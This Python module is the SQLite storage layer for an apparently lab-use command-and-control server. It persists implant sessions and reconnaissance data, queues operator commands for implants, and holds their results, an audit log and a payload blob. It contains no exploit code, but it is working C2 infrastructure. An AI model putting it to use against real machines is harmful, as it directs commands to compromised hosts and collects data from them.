#!/usr/bin/env python3
"""
SQLite persistence for the GHOST C2 server.

One module, one connection, one schema. The server used to keep sessions, task
queues, results and the audit trail in process memory only, so every restart
discarded the lab's history; this store is the source of truth behind the same
wire formats (the REST responses are unchanged, which is why the protocol suite
still passes untouched).

Deliberate boundaries:

- Memory still holds what a restart is *supposed* to reset: the server's ECDH
  keypair and, with it, every session channel key. Keys are deliberately not
  persisted: a restart rotates the server keypair, so a stored key would be
  stale by construction, and answering with it while advertising the new
  server point makes the implant re-key before it can decrypt the response --
  one failed beacon for nothing. The session row survives; the channel
  re-handshakes, which is the path the lab already measures.
- Standard library only (`sqlite3`), WAL journal, `synchronous=NORMAL`: a lab
  with a handful of agents and operators does not need more, and CI does not
  need a new dependency.
- Caps keep working and are enforced in SQL: `task_queue_max` per session,
  `result_cap` per session, `audit_cap` overall, and the same window of
  completed task ids the implant-side dedup relies on.
- The database is a local file and is **not encrypted at rest**; it is written
  with restrictive permissions and documented as cleartext in the README.
"""
from __future__ import annotations

import hashlib
import json
import os
import sqlite3
import threading
from datetime import datetime, timezone
from typing import Any

SCHEMA_VERSION = 1

_WRITE_CAPS = (0o600, 0o700)  # file mode, dir mode


def _iso(ts: float) -> str:
    """Epoch seconds -> the server's wire format (ISO-8601, Z, second precision)."""
    if not ts:
        return datetime.now(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")
    return (datetime.fromtimestamp(float(ts), tz=timezone.utc)
            .isoformat(timespec="seconds").replace("+00:00", "Z"))


def _ts(iso: str) -> float:
    """Wire format -> epoch seconds; 0.0 when the value cannot be parsed."""
    try:
        return datetime.fromisoformat(str(iso).replace("Z", "+00:00")).timestamp()
    except Exception:
        return 0.0


class Store:
    """Thread-safe SQLite store. One instance per server process."""

    def __init__(self, path: str, cfg: dict[str, Any]):
        self.path = path
        self._cfg = cfg                      # live reference: caps may change at startup
        self._lock = threading.RLock()
        self._db = sqlite3.connect(path, check_same_thread=False)
        self._db.row_factory = sqlite3.Row
        self._db.execute("PRAGMA journal_mode=WAL")
        self._db.execute("PRAGMA synchronous=NORMAL")
        self._db.execute("PRAGMA busy_timeout=5000")
        self._harden_file()
        with self._lock, self._db:
            self._migrate()

    # ── setup ────────────────────────────────────────────────────────────────
    def _harden_file(self) -> None:
        """Best-effort 0600 on the database file and its directory (POSIX only)."""
        if self.path == ":memory:" or os.name == "nt":
            return
        for target, mode in ((self.path, _WRITE_CAPS[0]),
                             (os.path.dirname(os.path.abspath(self.path)) or ".", _WRITE_CAPS[1])):
            try:
                os.chmod(target, mode)
            except OSError:
                pass

    def _migrate(self) -> None:
        version = self._db.execute("PRAGMA user_version").fetchone()[0]
        if version > SCHEMA_VERSION:
            raise RuntimeError(
                f"{self.path}: schema version {version} is newer than this server "
                f"understands ({SCHEMA_VERSION})")
        if version == SCHEMA_VERSION:
            return
        # v0 -> v1: create the initial schema. Future steps append `if version < N`
        # blocks so an existing lab database upgrades in place.
        self._db.executescript("""
            CREATE TABLE IF NOT EXISTS sessions (
              sid         TEXT PRIMARY KEY,
              remote_ip   TEXT    NOT NULL DEFAULT '',
              first_seen  REAL    NOT NULL DEFAULT 0,
              last_beacon REAL    NOT NULL DEFAULT 0,
              status      TEXT    NOT NULL DEFAULT 'pending',
              recon       TEXT    NOT NULL DEFAULT '{}',
              run         TEXT    NOT NULL DEFAULT '',
              last_rx_n   INTEGER NOT NULL DEFAULT 0,
              tx_n        INTEGER NOT NULL DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS tasks (
              seq       INTEGER PRIMARY KEY AUTOINCREMENT,
              sid       TEXT    NOT NULL,
              tid       TEXT    NOT NULL,
              cmd       TEXT    NOT NULL,
              state     TEXT    NOT NULL DEFAULT 'queued',
              queued_ts REAL    NOT NULL DEFAULT 0,
              sent_ts   REAL    NOT NULL DEFAULT 0
            );
            CREATE INDEX IF NOT EXISTS idx_tasks_sid ON tasks(sid, state, seq);
            CREATE TABLE IF NOT EXISTS results (
              rid    INTEGER PRIMARY KEY AUTOINCREMENT,
              sid    TEXT    NOT NULL,
              tid    TEXT    NOT NULL DEFAULT '',
              status TEXT    NOT NULL DEFAULT 'ok',
              output TEXT    NOT NULL DEFAULT '',
              ts     REAL    NOT NULL DEFAULT 0
            );
            CREATE INDEX IF NOT EXISTS idx_results_sid ON results(sid, rid);
            CREATE TABLE IF NOT EXISTS done_tids (
              seq INTEGER PRIMARY KEY AUTOINCREMENT,
              sid TEXT NOT NULL,
              tid TEXT NOT NULL
            );
            CREATE INDEX IF NOT EXISTS idx_done_sid ON done_tids(sid, seq);
            CREATE TABLE IF NOT EXISTS audit (
              id     INTEGER PRIMARY KEY AUTOINCREMENT,
              ts     REAL NOT NULL DEFAULT 0,
              ip     TEXT NOT NULL DEFAULT '',
              action TEXT NOT NULL,
              detail TEXT NOT NULL DEFAULT '{}'
            );
            CREATE TABLE IF NOT EXISTS payload (
              id     INTEGER PRIMARY KEY CHECK (id = 1),
              name   TEXT   NOT NULL DEFAULT '',
              blob   BLOB   NOT NULL,
              size   INTEGER NOT NULL DEFAULT 0,
              sha256 TEXT   NOT NULL DEFAULT '',
              ts     REAL   NOT NULL DEFAULT 0
            );
        """)
        self._db.execute(f"PRAGMA user_version = {SCHEMA_VERSION}")

    # ── internals ────────────────────────────────────────────────────────────
    def _pending(self, sid: str) -> int:
        return self._db.execute(
            "SELECT COUNT(*) FROM tasks WHERE sid=? AND state != 'done'", (sid,)
        ).fetchone()[0]

    def _result_count(self, sid: str) -> int:
        return self._db.execute(
            "SELECT COUNT(*) FROM results WHERE sid=?", (sid,)
        ).fetchone()[0]

    def _session_dict(self, row: sqlite3.Row, *, secrets: bool) -> dict:
        d = {
            "session":      row["sid"],
            "remote_ip":    row["remote_ip"],
            "first_seen":   _iso(row["first_seen"]),
            "last_beacon":  _iso(row["last_beacon"]),
            "recon":        json.loads(row["recon"] or "{}"),
            "run":          row["run"],
            "status":       row["status"],
            "pending_tasks": self._pending(row["sid"]),
            "result_count":  self._result_count(row["sid"]),
        }
        if secrets:
            d["last_rx_n"] = row["last_rx_n"]
            d["tx_n"]      = row["tx_n"]
        return d

    # ── sessions ─────────────────────────────────────────────────────────────
    def session(self, sid: str) -> dict | None:
        """Internal view, channel key and counters included."""
        with self._lock:
            row = self._db.execute("SELECT * FROM sessions WHERE sid=?", (sid,)).fetchone()
        return self._session_dict(row, secrets=True) if row else None

    def sessions_public(self) -> list[dict]:
        """Wire view for GET /sessions: no key material, counts computed in SQL."""
        with self._lock:
            rows = self._db.execute("SELECT * FROM sessions ORDER BY last_beacon DESC").fetchall()
            now = datetime.now(timezone.utc)
            out = []
            for row in rows:
                pub = self._session_dict(row, secrets=False)
                pub["task_states"] = self.task_states(row["sid"])
                try:
                    lb = datetime.fromisoformat(pub["last_beacon"].replace("Z", "+00:00"))
                    pub["idle_seconds"] = int((now - lb).total_seconds())
                except Exception:
                    pub["idle_seconds"] = 0
                out.append(pub)
        return out

    def upsert_beacon(self, sid: str, *, ip: str, ts: float, recon: dict,
                      run: str, last_rx_n: int, tx_n: int, status: str) -> None:
        with self._lock, self._db:
            existing = self._db.execute("SELECT first_seen FROM sessions WHERE sid=?",
                                        (sid,)).fetchone()
            first_seen = existing["first_seen"] if existing else ts
            self._db.execute(
                """INSERT INTO sessions (sid, remote_ip, first_seen, last_beacon, status,
                                         recon, run, last_rx_n, tx_n)
                   VALUES (?,?,?,?,?,?,?,?,?)
                   ON CONFLICT(sid) DO UPDATE SET
                     remote_ip=excluded.remote_ip, last_beacon=excluded.last_beacon,
                     status=excluded.status, recon=excluded.recon, run=excluded.run,
                     last_rx_n=excluded.last_rx_n, tx_n=excluded.tx_n""",
                (sid, ip, first_seen, ts, status, json.dumps(recon), run,
                 last_rx_n, tx_n))

    def set_status(self, sid: str, status: str) -> bool:
        with self._lock, self._db:
            cur = self._db.execute("UPDATE sessions SET status=? WHERE sid=?", (status, sid))
        return cur.rowcount > 0

    def set_last_rx(self, sid: str, n: int) -> None:
        with self._lock, self._db:
            self._db.execute("UPDATE sessions SET last_rx_n=? WHERE sid=?", (n, sid))

    # ── tasks ────────────────────────────────────────────────────────────────
    def enqueue(self, sid: str, cmd: str, ts: float) -> tuple[str | None, int]:
        """Append a queued task. Returns (tid or None when the queue is full, depth)."""
        import secrets as _secrets
        with self._lock, self._db:
            depth = self._pending(sid)
            if depth >= int(self._cfg["task_queue_max"]):
                return None, depth
            tid = _secrets.token_hex(4)
            self._db.execute(
                "INSERT INTO tasks (sid, tid, cmd, state, queued_ts) VALUES (?,?,?,'queued',?)",
                (sid, tid, cmd, ts))
        return tid, depth + 1

    def claim_task(self, sid: str, ts: float) -> dict | None:
        """Leftmost task still needing delivery; marks the queued -> sent transition.

        Only 'queued' and 'sent' are eligible. A task already sent but not yet
        acked is returned again on purpose: that is the at-least-once delivery
        the implant's task-id dedup exists for — but only after
        `task_resend_after` seconds have passed since the last serve. The
        window is the server-side guarantee that an implant with broken dedup
        (no tid tracking, acks dropped, replayed beacons) can never turn one
        task into a process storm: worst case it is re-served once per window,
        not once per beacon. sent_ts ratchets on every serve so the window
        always slides forward.

        A task the implant has already ACKED must NOT be re-served — it owns
        the task and is running (or has run) it. The previous predicate was
        `state != 'done'`, which also matched 'acked', so an acked task whose
        result was lost got re-served on every beacon; combined with the
        implant's immediate re-beacon that is a process storm (one operator
        command re-executed hundreds of times in ANY.RUN).
        """
        resend_after = float(self._cfg.get("task_resend_after", 60))
        with self._lock, self._db:
            row = self._db.execute(
                """SELECT seq, tid, cmd, state, sent_ts FROM tasks
                   WHERE sid=? AND state IN ('queued','sent') ORDER BY seq LIMIT 1""",
                (sid,)).fetchone()
            if not row:
                return None
            transitioned = row["state"] == "queued"
            if not transitioned and ts - row["sent_ts"] < resend_after:
                return None   # just served — give the implant the window to ack/result
            self._db.execute("UPDATE tasks SET state='sent', sent_ts=? WHERE seq=?",
                             (ts, row["seq"]))
        return {"tid": row["tid"], "cmd": row["cmd"], "transitioned": transitioned}

    def ack_task(self, sid: str, tid: str) -> bool:
        with self._lock, self._db:
            cur = self._db.execute(
                "UPDATE tasks SET state='acked' WHERE sid=? AND tid=? AND state IN ('queued','sent')",
                (sid, tid))
        return cur.rowcount > 0

    def kill(self, sid: str) -> bool:
        """Kill = status change plus an empty queue.

        The beacon answers a killed session with `exit` on its own; the old code
        also pushed a bare string into the task deque, which made every later
        `t["state"]` walk raise TypeError (500 on /sessions and on the next
        beacon). Nothing is appended here.
        """
        with self._lock, self._db:
            cur = self._db.execute("UPDATE sessions SET status='killed' WHERE sid=?", (sid,))
            if cur.rowcount:
                self._db.execute("DELETE FROM tasks WHERE sid=?", (sid,))
        return cur.rowcount > 0

    def complete_task(self, sid: str, tid: str) -> None:
        """Task finished: drop the row, remember the id for duplicate detection."""
        with self._lock, self._db:
            self._db.execute("DELETE FROM tasks WHERE sid=? AND tid=?", (sid, tid))
            self._db.execute("INSERT INTO done_tids (sid, tid) VALUES (?,?)", (sid, tid))
            self._trim_done(sid)

    def _trim_done(self, sid: str) -> None:
        cap = int(self._cfg["task_queue_max"])
        self._db.execute(
            """DELETE FROM done_tids WHERE sid=? AND seq NOT IN
               (SELECT seq FROM done_tids WHERE sid=? ORDER BY seq DESC LIMIT ?)""",
            (sid, sid, cap))

    def is_done_tid(self, sid: str, tid: str) -> bool:
        with self._lock:
            return self._db.execute(
                "SELECT 1 FROM done_tids WHERE sid=? AND tid=? LIMIT 1", (sid, tid)
            ).fetchone() is not None

    def task_states(self, sid: str) -> dict:
        with self._lock:
            rows = self._db.execute(
                "SELECT state, COUNT(*) AS n FROM tasks WHERE sid=? GROUP BY state", (sid,)
            ).fetchall()
        counts = {"queued": 0, "sent": 0, "acked": 0, "done": 0}
        for r in rows:
            if r["state"] in counts:
                counts[r["state"]] = r["n"]
        return counts

    def delete_tasks(self, sid: str) -> None:
        with self._lock, self._db:
            self._db.execute("DELETE FROM tasks WHERE sid=?", (sid,))

    # ── results ──────────────────────────────────────────────────────────────
    def add_result(self, sid: str, tid: str, status: str, output: str, ts: float) -> bool:
        """Store a result. False when this tid was already completed (duplicate)."""
        if tid and self.is_done_tid(sid, tid):
            return False
        with self._lock, self._db:
            if tid:
                self.complete_task(sid, tid)
            self._db.execute(
                "INSERT INTO results (sid, tid, status, output, ts) VALUES (?,?,?,?,?)",
                (sid, tid, status, output, ts))
            self._trim_results(sid)
        return True

    def _trim_results(self, sid: str) -> None:
        cap = int(self._cfg["result_cap"])
        self._db.execute(
            """DELETE FROM results WHERE sid=? AND rid NOT IN
               (SELECT rid FROM results WHERE sid=? ORDER BY rid DESC LIMIT ?)""",
            (sid, sid, cap))

    def results(self, sid: str) -> list[dict]:
        with self._lock:
            rows = self._db.execute(
                "SELECT ts, tid, status, output FROM results WHERE sid=? ORDER BY rid", (sid,)
            ).fetchall()
        return [{"ts": _iso(r["ts"]), "tid": r["tid"], "status": r["status"],
                 "output": r["output"]} for r in rows]

    def clear_results(self, sid: str) -> None:
        with self._lock, self._db:
            self._db.execute("DELETE FROM results WHERE sid=?", (sid,))

    # ── audit ────────────────────────────────────────────────────────────────
    def audit(self, action: str, ip: str, detail: dict, ts: float) -> None:
        with self._lock, self._db:
            self._db.execute("INSERT INTO audit (ts, ip, action, detail) VALUES (?,?,?,?)",
                             (ts, ip, action, json.dumps(detail)))
            cap = int(self._cfg["audit_cap"])
            self._db.execute(
                """DELETE FROM audit WHERE id NOT IN
                   (SELECT id FROM audit ORDER BY id DESC LIMIT ?)""", (cap,))

    def audit_entries(self, limit: int) -> list[dict]:
        with self._lock:
            rows = self._db.execute(
                "SELECT ts, ip, action, detail FROM audit ORDER BY id DESC LIMIT ?",
                (int(limit),)).fetchall()
        return [{"ts": _iso(r["ts"]), "ip": r["ip"], "action": r["action"],
                 "detail": json.loads(r["detail"] or "{}")} for r in reversed(rows)]

    def clear_audit(self) -> None:
        with self._lock, self._db:
            self._db.execute("DELETE FROM audit")

    # ── payload ──────────────────────────────────────────────────────────────
    def set_payload(self, name: str, blob: bytes, ts: float) -> None:
        with self._lock, self._db:
            self._db.execute(
                """INSERT INTO payload (id, name, blob, size, sha256, ts) VALUES (1,?,?,?,?,?)
                   ON CONFLICT(id) DO UPDATE SET name=excluded.name, blob=excluded.blob,
                     size=excluded.size, sha256=excluded.sha256, ts=excluded.ts""",
                (name, blob, len(blob), hashlib.sha256(blob).hexdigest(), ts))

    def payload(self) -> dict | None:
        with self._lock:
            row = self._db.execute("SELECT name, blob, size, sha256, ts FROM payload WHERE id=1").fetchone()
        if not row:
            return None
        return {"name": row["name"], "blob": row["blob"], "size": row["size"],
                "sha256": row["sha256"], "ts": _iso(row["ts"])}

    # ── maintenance ──────────────────────────────────────────────────────────
    def prune_sessions(self, cutoff_ts: float) -> list[str]:
        """Drop sessions idle beyond the janitor cutoff and everything they own."""
        with self._lock, self._db:
            dead = [r["sid"] for r in self._db.execute(
                "SELECT sid FROM sessions WHERE last_beacon < ?", (cutoff_ts,)).fetchall()]
            for sid in dead:
                self._db.execute("DELETE FROM sessions  WHERE sid=?", (sid,))
                self._db.execute("DELETE FROM tasks     WHERE sid=?", (sid,))
                self._db.execute("DELETE FROM results   WHERE sid=?", (sid,))
                self._db.execute("DELETE FROM done_tids WHERE sid=?", (sid,))
        return dead

    def counts(self) -> dict:
        with self._lock:
            sessions = self._db.execute("SELECT COUNT(*) FROM sessions").fetchone()[0]
            pending = self._db.execute(
                "SELECT COUNT(*) FROM sessions WHERE status='pending'").fetchone()[0]
        return {"sessions": sessions, "pending": pending}

    def schema_version(self) -> int:
        with self._lock:
            return int(self._db.execute("PRAGMA user_version").fetchone()[0])

    def close(self) -> None:
        with self._lock:
            try:
                self._db.close()
            except Exception:
                pass
